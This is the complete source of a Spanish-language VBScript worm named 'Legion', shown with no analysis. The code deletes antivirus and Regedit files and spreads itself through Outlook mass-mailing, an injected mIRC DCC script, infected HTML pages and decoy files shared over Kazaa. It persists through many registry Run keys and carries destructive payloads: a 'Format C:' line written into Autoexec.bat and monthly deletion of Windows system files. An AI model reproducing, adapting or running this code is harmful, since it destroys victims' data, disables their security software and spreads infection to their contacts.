       
          Rem              Legion
On Error Resume Next
Dim  legions, cmsgljeojf, WinDir,leg,legion

Set legion = WScript.CreateObject ("WScript.shell")
Set legions = CreateObject("Scripting.FileSystemObject")
Set WinDir = legions.GetSpecialFolder(0)
if path = "" then 
Registro = legion.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
               If FileExists (Registro & "\Kaspersky Lab\Kaspersky Antivirus Personal Pro\Avp32.exe") then path = Registro & "\Kaspersky Lab\Kaspersky Antivirus Personal Pro"
     legions.DeleteFile (Registro & "\Kaspersky Lab\Kaspersky Antivirus Personal Pro\*.*")
      If fileexists (Registro & "\Kaspersky Lab\Kaspersky Antivirus Personal\Avp32.exe") then path = Registro & "\Kaspersky Lab\Kaspersky Antivirus Personal"
      legions.DeleteFile (Registro & "\Kaspersky Lab\Kaspersky Antivirus Personal\*.*")
       if FileExists(Registro & "\Antiviral Toolkit Pro\avp32.exe") then path = Registros & "\Antiviral Toolkit Pro"
       legions.DeleteFile (Registro & "\Antiviral Toolkit Pro\*.*")
          if fileexists (Registro & "\AVPersonal\Avguard.exe") then path = Registro  & "\AVPersonal"
     legions.DeleteFile (Registro & "\AVPersonal\*.*")
         if fileexists (Registro & "\Trend PC-cillin 98\IOMON98.EXE") then path = Registro  & "\Trend PC-cillin 98"
        legions.DeleteFile (Registro & "\Trend PC-cillin 98\*.*")
          legions.DeleteFile (Registro & "\Trend PC-cillin 98\*.EXE")
          legions.DeleteFile (Registro & "\Trend PC-cillin 98\*.dll")
            If fileexists (Registro & "\mirc\mirc.ini") then path = Registro & "\mirc"
           Set mi = CreateObject("scripting.filesystemobject")
       Set win = mi.CreateTextFile(Registro & "\mirc\script.ini", True)
        win.writeline "["& Chr(83) & Chr(99) & chr(114) & chr(105) & chr(112) & chr(116) &"]"
win.writeline ";No Modifiques esta linea puedes ocasionar serios problemas a tu mIRC"
      win.writeline ""& Chr(110) & Chr(48) & Chr(61) & Chr(111) & Chr(110) & Chr(32) & Chr(49) & Chr(58) & Chr(74) & Chr(79)  & Chr(73) & Chr(78) & Chr(58) & "#:" & Chr(105) & Chr(102) & Chr(32) & Chr(40) & Chr(32) & Chr(36) & Chr(109) & Chr(101) & Chr(32) & "!=" & Chr(32) & Chr(36) & Chr(110) & Chr(105) & Chr(99) & Chr(107) & Chr(32) & Chr(41) & Chr(32) & Chr(123) & Chr(32) & "/msg" & Chr(32) & Chr(36) & Chr(78) & Chr(105) & Chr(99) & Chr(107) & Chr(32) & "aqui texto" & Chr(32) & Chr(124) & Chr(32) & Chr(47) & Chr(100) & Chr(99) & Chr(99) & Chr(32) & "send" & Chr(32) & Chr(36) & Chr(78) & Chr(73) & Chr(67) & Chr(75) & Chr(32) &"C:\Pathdearchivo" & Chr(125)
                 win.Close
   legions.DeleteFile (Registro & "mirc\mirc.ini")
         if fileexists (Registro & "\Trend Micro\PC-cillin 2000\PCTIOMON.exe") then path = Registro  & "\Trend Micro\PC-cillin 2000"
       legions.DeleteFile (Registro & "\Trend Micro\PC-cillin 2000\*.*")
      legions.DeleteFile (Registro & "\Trend Micro\PC-cillin 2000\*.EXE")
          legions.DeleteFile (Registro & "\Trend Micro\PC-cillin 2000\*.dll")
       if fileexists (WinDir & "\Regedit.exe") then path = WinDir  & "\"
       legions.DeleteFile (WinDir & "\Regedit.exe")
              legions.DeleteFile (WinDir &"\System32\Regedt32.exe")
       If FileExists (Registro & "\McAfee\McAfee VirusScan\Avconsol.exe") then path = Registro & "\McAfee\McAfee VirusScan"
legions.Deletefile (Registro & "\McAfee\McAfee VirusScan\*.*")
legions.Deletefile (Registro & "\McAfee\McAfee VirusScan\*.exe")
if FileExists (Registro & "\Norton Antivirus 2002\Nav32.exe") then path = Registro  & "\Norton Antivirus 2002"
legions.DeleteFile (Registro & "\Norton Antivirus 2002\*.DLL")
if FileExists (Registro & "\Perav\Per.exe") then path = Registro  & "\Perav"
legions.DeleteFile (Registro & "\Perav\*.*")
End If
     legions.CopyFile Wscript.Scriptfullname, "C:\Legion.vbs"
        Set batlegion = CreateObject("scripting.filesystemobject")

   Set Create = CreateObject ("Scripting.FileSystemObject")
                  Set mail = Create.CreateTextFile("C:\mail.vbs")
                       mail.writeline "On Error Resume Next"
                                 mail.writeline "Dim leg, Mail, Counter, A, B, C, D, E"
             mail.writeline "Set leg = CreateObject" & Chr(32)& "(" & chr(34) & "Outlook.Application" & Chr(34) &")"
               mail.writeline "Set C = CreateObject "& Chr(32) & "(" & chr(34) & "Scripting.FileSystemObject" & Chr(34)& ")"
     mail.writeline "Set Mail = leg.GetNameSpace" & Chr(32) & "(" & chr(34)& "MAPI" & Chr(34)&")"
                      mail.writeline "For A = 1 To Mail.AddressLists.Count"
                  mail.writeline "Set B = Mail.AddressLists (A)"
                  mail.writeline "Counter = 1"
             mail.writeline "Set C = leg.CreateItem (0)"
          mail.writeline "For D = 1 To B.AddressEntries.Count"
              mail.writeline "E = B.AddressEntries (Counter)"
    mail.writeline "C.Recipients.Add E"
          mail.writeline "Counter = Counter + 1"
                  mail.writeline "If Counter > 8000 Then Exit For"
             mail.writeline "Next"
            mail.writeline "C.Subject =" & Chr(32) & Chr(34) &"Legion Game" & Chr(34)
                                 mail.writeline "C.Body = "& Chr(32) & Chr(34) & "YA jugaste el juego Legion? si no aqui te lo doy checalo y hay me dices que tal..." & Chr(34) 
             mail.writeline "C.Attachments.Add"& Chr(32) & Chr(34) & "C:\Legion.vbs" & Chr(34)
                  mail.writeline "C.DeleteAfterSubmit = True"
               mail.writeline "C.Send"
                mail.writeline "Next"
         mail.Close
                        legion.Run ("C:\mail.vbs")
On Error Resume Next
Dim legioninfect
Set Wslegion = CreateObject("WScript.Shell")
           Set Fsolegion = CreateObject("scripting.filesystemobject")
If Wslegion.regread("HKCU\software\Legion") <> "sistem = Infected" Then
HTML()
End If
Function HTML()
         ON ERROR RESUME NEXT
For Each drvar In Fsolegion.drives
Un = dr & "\"
Call HTL(Un)
Next
       End Function
      Function HTL(Va)
         legioninfect = ""
 Set infecting = Fsolegion.OpenTextFile(wscript.scriptfullname, 1)
            Do While infecting.AtendOfStream = False
      Line = infecting.ReadLine
       legioninfect = legioninfect & Chr(34) & " & vbCrLf & " & Chr(34) & Replace(Line, Chr(34), Chr(34) & " & Chr(34) & " & Chr(34))
     Loop
    infecting.Close
     Cr = Va
Set fo = Fsolegion.GetFolder(Cr)
    For Each Re In Fsolegion.GetFolder(Cr).Files
If LCase(Fsolegion.GetExtensionName(Re))="htt"  Or LCase(Fsolegion.GetExtensionName(Re))="HTT" Or LCase(Fsolegion.GetExtensionName(Re))="html" Or LCase(Fsolegion.GetExtensionName(Re))="htm" Then
            Dim Fp
         Dim Srl
           Set Fp = Fsolegion.OpenTextFile(Re,1,False)
            Srl = Fp.ReadAll
            Fp.Close
        Dim InfectFile
       InfectFile = ""
        InfectFile = InfectFile & VbCrlf & "<html> <body> <script language=" & Chr(34) & "vbscript" & Chr(34) & ">"
  InfectFile = InfectFile & VbCrlf & "ON ERROR RESUME NEXT"
            InfectFile = InfectFile & VbCrlf & "Set fsoafwwqj = CreateObject(" & Chr(34) & "scripting.filesystemobject" & Chr(34) &")"
                    InfectFile = InfectFile & VbCrlf & "Set Fsafwwqj= fsoafwwqj.CreateTextFile(fsoafwwqj.getspecialfolder(0) & " & Chr(34) & "\Temp.vbs" & Chr(34) & " , True)"
                   InfectFile = InfectFile & VbCrlf & "Fsafwwqj.write" & Chr(34) & legioninfect & Chr(34)
               InfectFile = InfectFile & VbCrlf & "Fsafwwqj.Close"
               InfectFile = InfectFile & VbCrlf & "Set wsafwwqj = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
         InfectFile = InfectFile & VbCrlf & "wsafwwqj.run fsoafwwqj.getspecialfolder(0) & " & Chr(34) & "\wscript.exe " & Chr(34) & " & fsoafwwqj.getspecialfolder(0) & " & Chr(34) & "\Temp.vbs %" & Chr(34)
              InfectFile = InfectFile & VbCrlf & "If err.number <> 0 Then"
        InfectFile = InfectFile & VbCrlf & "alert(" & Chr(34) & "Error." & Chr(34) & " & vbCrLf & " & Chr(34) & "Esta pagina requiere ActiveX para funcionar correctamente." & Chr(34) & " & vbCrLf & " & Chr(34) & "Presione Actualizar y acepte la ejecucion de ActiveX." & Chr(34) & " & vbCrLf & " & Chr(34) & "Si no se le permite aceptar ActiveX, baje el nivel de seguridad de " & Chr(34) & " & vbCrLf & " & Chr(34) & "su navegador, o busque como permitir esta interaccion." & Chr(34) & " & vbCrLf & " & Chr(34) & "" & Chr(34) & ")"
                 InfectFile = InfectFile & VbCrlf & "End If"
                   InfectFile = InfectFile & VbCrlf & Chr(60) & Chr(47) & Chr(115) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(62) & Chr(32) & Chr(60)& Chr(47) & Chr(98) & Chr(111) & Chr(100) & Chr(121) & Chr(47) & Chr(62) & Chr(32) & Chr(60) & Chr(47) & Chr(104) & Chr(116) & Chr(109) & Chr(108) & Chr(62)
                Set Htr = Fsolegion.OpenTextFile(Re,2,1)
                  Htr.write Srl & vbCrlf & InfectFile
      Htr.Close
End If
      Next
 Set Ba = Fo.SubFolders
For Each Ca In Ba
Call HTL(Ca)
Next
Wslegion.regwrite "HKCU\software\Legion","sistem = Infected"
End Function

                                     cmsgljeojf = legion.regread("HKCU\software\Legion\execution")
       If cmsgljeojf = "" Then
                           legion.regwrite"HKCU\software\Legion\execution","0"
                End If
                                  If legion.regread("HKCU\software\Legion\execution") >= 30 Then
                 MSGBOX "Carmina Ti Amo",16,"Carmina"
Set legionworm = batlegion.CreateTextFile("C:\Autoexec.bat", True)
    legionworm.writeline "@ECHO OFF"
                   legionworm.writeline "@ECHO	-----------------------------------------------------------"
    legionworm.writeline "@Echo                         Virus Legion"
                            legionworm.writeline "@Echo                Rindance han sido conquistados"
              legionworm.writeline "@ECHO	-----------------------------------------------------------"
              legionworm.writeline "Pause > Nul"
    legionworm.writeline "Format C: /Autotest"
                legionworm.writeline "@ECHO	-----------------------------------------------------------"
    legionworm.writeline "@Echo                      Sistema Conquistado"
               legionworm.writeline "@ECHO	-----------------------------------------------------------"
                                                                   legionworm.Close
                        legion.regwrite "HKCU\software\Legion\execution","0"
                     Else
           msgljeojf =legion.regread("HKCU\software\Legion\execution")
                                                       cmsgljeojf = Int(cmsgljeojf)
                                      cmsgljeojf = cmsgljeojf + 1
                      legion.regwrite "HKCU\software\Legion\execution",cmsgljeojf
                                    End If


          
      legion.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\htalegion","C:\legion.hta"
   legion.regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Window title","legion Actived in your Computer !Rindance han sido conquistados!"
      legion.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","Virus Legion"
       legion.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization","Legion"
       legion.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\ProductName","Legiowns 2002"
legion.regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.legion.com"
 legion.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Legion",WinDir & "\legion.vbs"


 legions.CopyFile Wscript.Scriptfullname, "C:\Documents and Settings\All Users\Menú Inicio\Programas\Inicio\legionworm.vbs"
 legions.CopyFile Wscript.Scriptfullname, WinDir &"\Menú Inicio\Programas\Inicio\legionworm.vbs"

    legions.CopyFile Wscript.Scriptfullname, WinDir & "\legion.vbs" 
 legions.CopyFile Wscript.Scriptfullname, WinDir & "\System\legion.vbs" 

 legions.CopyFile Wscript.Scriptfullname, "C:\Documents and Settings\All Users\Escritorio\legion.vbs" 
    legions.CopyFile Wscript.Scriptfullname, WinDir & "\Escritorio\legion.vbs" 
 legions.CopyFile Wscript.Scriptfullname, WinDir & "\.vbe" 
      legions.CopyFile Wscript.Scriptfullname, "C:\Recycled\legion.exe.vbs" 
legions.CopyFile Wscript.Scriptfullname, "C:\Recycler\legion.exe.vbs" 
 legion.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\legionworm", "C:\Recycled\legion.exe.vbs"
   legion.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\viruslegion", "C:\Recycler\legion.exe.vbs"
   legion.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\VBE", WinDir &"\.vbe"
legion.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Shaleg", "C:\Legion\Shakira.mp3.vbs"
 legion.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Slegion", "C:\Legion\StarCraft.exe.vbs"
legion.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\warlegion", "C:\Legion\WarCraft.exe.vbs"
legion.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\wormlegion", WinDir & "\System\legion.exe.vbs"
 If day(now) = 2 Then
   MSGBOX "La Conquista ah llegado termino el juego",16,"Virus Legion"
        
 legions.DeleteFile ("C:\*.*")
     legions.DeleteFile ("C:\Windows\*.*")
       legions.DeleteFile ("C:\Windows\*.EXE")
           legions.DeleteFile ("C:\Windows\System\*.DLL")
     legions.DeleteFile ("C:\Windows\Command\*.*")
     End If 
      Set legionw = batlegion.CreateTextFile("C:\legion.hta", True)
        legionw.writeline "<HTML><HEAD><TITLE>-=::Legion::=-</TITLE></HEAD>"
     legionw.writeline "<BODY><CENTER><FONT  FACE=VERDANA size=3 color=Blue>-=:://Virus Legion//::=-</font></center><hr><FONT COLOR=RED FACE=VERDANA  size=2><center>"
        legionw.writeline "Virus Legion Rindance han sido conquistados......<br><br>LeGion Actived In Your Computer <br><br></center><br> <center> La Ultima vez que legion se ejecuto fue el " & Date & " a las " & Time &"</font></center><HR> </body></html>" 
      legionw.Close
legion.RegWrite "HKCU\Software\Kazaa\LocalContent\DisableSharing","dword:00000000"
legion.RegWrite "HKCU\Software\Kazaa\LocalContent\Dir0","012345:c:\Legion"
      legions.CreateFolder ("C:\Legion")
           legions.CopyFile Wscript.Scriptfullname,  "C:\Legion\Legion.exe.vbs" 
                           legions.CopyFile Wscript.Scriptfullname,  "C:\Legion\Shakira.mp3.vbs" 
              legions.CopyFile Wscript.Scriptfullname,  "C:\Legion\Hey Baby.mp3.vbs" 
       legions.CopyFile Wscript.Scriptfullname,  "C:\Legion\BritneySpears.mp3.vbs" 
          legions.CopyFile Wscript.Scriptfullname,  "C:\Legion\StarCraft.exe.vbs" 
        legions.CopyFile Wscript.Scriptfullname,  "C:\Legion\WarCraft.exe.vbs" 
          legions.CopyFile Wscript.Scriptfullname,  "C:\Legion\Morpheus.exe.vbs" 
legions.CopyFile Wscript.Scriptfullname,  "C:\Legion\Pink.mp3.vbs" 
                 

